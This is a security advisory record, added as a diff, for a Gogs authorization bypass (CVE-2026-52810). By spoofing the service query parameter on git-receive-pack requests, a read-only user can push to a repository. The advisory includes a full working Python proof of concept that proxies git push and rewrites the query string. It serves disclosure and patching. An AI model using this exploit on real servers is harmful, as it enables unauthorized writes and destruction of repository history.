@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-wmfg-5p4h-5fw3",
+  "modified": "2026-06-23T17:15:12.206436259Z",
+  "published": "2026-06-23T17:03:41Z",
+  "aliases": [
+    "CVE-2026-52810"
+  ],
+  "summary": "Gogs allows users to write to readonly repositories using receive-pack + service=git-upload-pack confusion",
+  "details": "### Summary\n\nGit smart HTTP authorizes `POST …/git-receive-pack` using the client-supplied service query string (so `?service=git-upload-pack` is evaluated as read access) while routing still runs git receive-pack, allowing push where only read should be allowed.\n\n### Details\n\nGogs' Git Smart HTTP handler for repository RPCs relies on a client-supplied query parameter to decide which authorization policy to apply. The Git protocol exposes two primary RPCs over HTTP: `upload-pack` for fetch (read) and `receive-pack` for push (write).\n\nIn the affected implementation, the code derives the access mode from the `service` query parameter (for example, `service=git-upload-pack`) instead of the actual RPC path being executed. As a result, a request sent to the `receive-pack` endpoint can be incorrectly treated as a read operation if the query parameter claims it is an `upload-pack`. This behavior enables a request to POST to the write endpoint (`/repo.git/git-receive-pack`) while including a query string that indicates a read service.\n\nRoute dispatch still executes the receive-pack code path, but authorization is evaluated as if the request were a read. A user who is normally only allowed to read a repository, can now write to it.\n\nOne edge case is fully public repositories, viewable by anonymous users. Since performing this exploit results in a `AuthUser` property becoming `nil` in this case, a part of the code that uses it crashes (500 Internal Server Error), making it impossible to exploit.\n\nThe two situations in which this is vulnerable are:\n* Attacker = collaborator with only Read rights \u0026 victim = owner of the repository\n* Instance using `REQUIRE_SIGNIN_VIEW = true`. Attacker = any signed in user \u0026 victim = any user with a public repository\n\n### PoC\n\n1. Create a Gogs instance (eg. http://localhost:3000) with 2 users: `victim` \u0026 `attacker`\n2. As the victim, create a new private repository and add the attacker as a Read collaborator:\n\n\u003cimg width=\"1029\" height=\"387\" alt=\"image\" src=\"https://github.com/user-attachments/assets/1f6b7f72-eaab-4970-bf65-221f1cebbbfa\" /\u003e\n\n3. As the attacker, execute the following Python script (editing global vars as required):\n\n```py\nfrom __future__ import annotations\n\nimport os\nimport shutil\nimport subprocess\nimport sys\nimport tempfile\nimport threading\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom urllib.parse import quote, urlsplit, urlunsplit\n\nimport requests\n\nREPO_URL = \"http://localhost:3000/victim/target\"\nUSERNAME = \"attacker\"\nPASSWORD = \"attacker\"\n\nclass ProxyHandler(BaseHTTPRequestHandler):\n    upstream_scheme: str\n    upstream_netloc: str\n    log_rewrite: bool\n\n    def log_message(self, *_args) -\u003e None:\n        return\n\n    def do_GET(self) -\u003e None:\n        self._relay(\"GET\")\n\n    def do_POST(self) -\u003e None:\n        self._relay(\"POST\")\n\n    def _relay(self, method: str) -\u003e None:\n        raw = self.path\n        if raw.startswith(\"http://\") or raw.startswith(\"https://\"):\n            u = urlsplit(raw)\n            scheme, netloc, path, query = u.scheme, u.netloc, u.path, u.query\n        else:\n            u = urlsplit(raw)\n            scheme, netloc, path, query = (\n                self.upstream_scheme,\n                self.upstream_netloc,\n                u.path,\n                u.query,\n            )\n\n        q = query or \"\"\n        if path.endswith(\"/git-receive-pack\") and \"service=\" not in q:\n            query = f\"{q}\u0026service=git-upload-pack\" if q else \"service=git-upload-pack\"\n            if self.log_rewrite:\n                sys.stderr.write(\n                    f\"[poc] rewrite receive-pack -\u003e {path}?{query}\\n\")\n\n        url = urlunsplit((scheme, netloc, path, query, \"\"))\n        length = self.headers.get(\"Content-Length\")\n        body = self.rfile.read(int(length)) if length else None\n\n        skip = {\n            \"host\",\n            \"connection\",\n            \"proxy-connection\",\n            \"content-length\",\n            \"transfer-encoding\",\n        }\n        out_headers = {}\n        for k, v in self.headers.items():\n            if k.lower() in skip:\n                continue\n            out_headers[k] = v\n        out_headers[\"Host\"] = netloc\n\n        try:\n            with requests.request(\n                method,\n                url,\n                data=body,\n                headers=out_headers,\n                timeout=600,\n                stream=True,\n            ) as resp:\n                resp.raw.decode_content = False\n                data = resp.raw.read()\n                status = resp.status_code\n                headers = resp.headers\n        except requests.RequestException as exc:\n            self.send_error(502, f\"upstream: {exc}\")\n            return\n\n        hop_by_hop = {\n            \"transfer-encoding\",\n            \"connection\",\n            \"content-encoding\",\n            \"proxy-authenticate\",\n            \"proxy-authorization\",\n            \"te\",\n            \"trailers\",\n            \"upgrade\",\n        }\n        self.send_response(status)\n        for k, v in headers.items():\n            if k.lower() in hop_by_hop:\n                continue\n            self.send_header(k, v)\n        self.send_header(\"Content-Length\", str(len(data)))\n        self.end_headers()\n        self.wfile.write(data)\n\ndef _run_git(cwd: str, *args: str, env: dict[str, str] | None = None) -\u003e None:\n    r = subprocess.run([\"git\", *args], cwd=cwd, env=env,\n                       capture_output=True, text=True)\n    if r.returncode != 0:\n        sys.stderr.write(r.stdout or \"\")\n        sys.stderr.write(r.stderr or \"\")\n        raise SystemExit(r.returncode)\n\ndef main() -\u003e None:\n    base = urlsplit(REPO_URL)\n    repo_path = f\"{base.path.rstrip('/')}.git\"\n    auth = f\"{quote(USERNAME, safe='')}:{quote(PASSWORD, safe='')}@{base.netloc}\"\n    remote = urlunsplit((base.scheme, auth, repo_path, \"\", \"\"))\n\n    ProxyHandler.upstream_scheme = base.scheme\n    ProxyHandler.upstream_netloc = base.netloc\n    ProxyHandler.log_rewrite = True\n\n    srv = HTTPServer((\"127.0.0.1\", 0), ProxyHandler)\n    port = srv.server_address[1]\n    t = threading.Thread(target=srv.serve_forever, daemon=True)\n    t.start()\n\n    tmp = tempfile.mkdtemp(prefix=\"gogs-git-poc-\")\n    try:\n        _run_git(tmp, \"init\")\n        _run_git(tmp, \"config\", \"user.email\", \"poc@example.invalid\")\n        _run_git(tmp, \"config\", \"user.name\", \"gogs git http poc\")\n        with open(f\"{tmp}/POC_VULN.txt\", \"w\", encoding=\"utf-8\") as f:\n            f.write(\n                \"Created by local PoC: Git HTTP path is receive-pack while \"\n                \"authorization follows forged service=git-upload-pack.\\n\"\n            )\n        _run_git(tmp, \"add\", \"POC_VULN.txt\")\n        _run_git(tmp, \"commit\", \"-m\",\n                 \"poc: unauthorized push via service query confusion\")\n        _run_git(tmp, \"branch\", \"-M\", \"poc/git-http-confusion\")\n        _run_git(tmp, \"remote\", \"add\", \"origin\", remote)\n\n        env = os.environ.copy()\n        proxy_url = f\"http://127.0.0.1:{port}\"\n        env[\"http_proxy\"] = proxy_url\n        env[\"HTTP_PROXY\"] = proxy_url\n        env[\"https_proxy\"] = proxy_url\n        env[\"HTTPS_PROXY\"] = proxy_url\n\n        push = subprocess.run(\n            [\"git\", \"push\", \"-u\", \"origin\", \"poc/git-http-confusion\"],\n            cwd=tmp,\n            env=env,\n            capture_output=True,\n            text=True,\n        )\n        if push.returncode != 0:\n            sys.stderr.write(push.stdout or \"\")\n            sys.stderr.write(push.stderr or \"\")\n            sys.exit(push.returncode)\n\n        sys.stdout.write(push.stdout or \"\")\n        sys.stderr.write(\n            f\"\\n[poc] push succeeded. Branch poc/git-http-confusion should exist on {REPO_URL}.\\n\"\n        )\n    finally:\n        srv.shutdown()\n        shutil.rmtree(tmp, ignore_errors=True)\n\nif __name__ == \"__main__\":\n    main()\n```\n\n4. Reload the repo URL and notice the attacker successfully wrote to the read-only repo:\n\n\u003cimg width=\"1038\" height=\"398\" alt=\"image\" src=\"https://github.com/user-attachments/assets/4ada8b19-8cbd-40b0-a324-e93ed4d1c965\" /\u003e\n\n### Impact\n\nIf you can read a repository, and an anonymous user cannot, you can write to it. This affects some cases where read-only collaborator access is given, but is most impactful in instances with `REQUIRE_SIGNIN_VIEW = true` configured, because then all repositories will be writable to any user.\nUsing force push this can also affect availability, as the original code in the main branch, for example, can be overridden without leaving history.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "gogs.io/gogs",
+        "purl": "pkg:golang/gogs.io/gogs"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.14.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-wmfg-5p4h-5fw3/GHSA-wmfg-5p4h-5fw3.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gogs/gogs/security/advisories/GHSA-wmfg-5p4h-5fw3"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gogs/gogs/pull/8331"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gogs/gogs/commit/7c9cf53aca957959bcd98b0cc987d9901b7cb184"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gogs/gogs"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gogs/gogs/releases/tag/v0.14.3"
+    }
+  ]
+}
